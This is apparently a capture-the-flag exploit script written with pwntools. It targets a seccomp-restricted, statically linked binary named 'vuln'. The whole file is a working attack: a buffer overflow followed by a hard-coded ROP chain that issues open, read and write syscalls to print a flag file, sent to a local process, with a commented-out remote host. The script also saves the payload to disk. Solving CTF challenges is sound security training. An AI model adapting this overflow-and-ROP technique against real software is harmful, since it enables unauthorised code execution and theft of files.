#!/usr/bin/env python3
#The binary given is a Statically linked binary with seccomp rules
#The seccomp rules prevents a direct execve syscall and also the presence of NX
#So we have to make a ORW rop..
#The plan is simple..Overflow the buffer and make a ORW Rop to read the flag contents.
#Use the xchg instruction to get the fd from the open syscall to pass to read and write..

from pwn import *


e = ELF("./vuln")
r= process("./vuln")
#r = remote("gc1.eng.run",30344)
r.sendlineafter(b"+-----------------------------&",b"A")
file_handle = open("exploit.txt","wb")
file_handle.write(b"A" + b'\n')
pop_rax = 0x0000000000469407
pop_rdi = 0x00000000004018ea
pop_rsi = 0x0000000000402e08
pop_rdx = 0x00000000004017ef
syscall = 0x0000000000435844
xchg = 0x486dd5
exploit = b"A" * 18 + p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(0x4ff270) + p64(pop_rdx) + p64(0x10) + p64(syscall) + p64(pop_rax) + p64(2) + p64(pop_rdi) + p64(0x4ff270) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(syscall) + p64(xchg) + p64(pop_rax) + b"AAAAA" + p64(0) +  p64(pop_rsi) + p64(0x4ff280) + p64(pop_rdx) + p64(0x40) + p64(syscall) + p64(pop_rax) + p64(1) + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(0x4ff280) + p64(pop_rdx) + p64(0x40) + p64(syscall) + p64(0)
file_handle.write(exploit + b"\n")
r.sendlineafter(b"Enter the number of burritos you can eat ->",exploit)
file_handle.write(b"/handouts/flag\x00")
file_handle.close()
r.sendline(b"/flag.txt\x00")
r.interactive()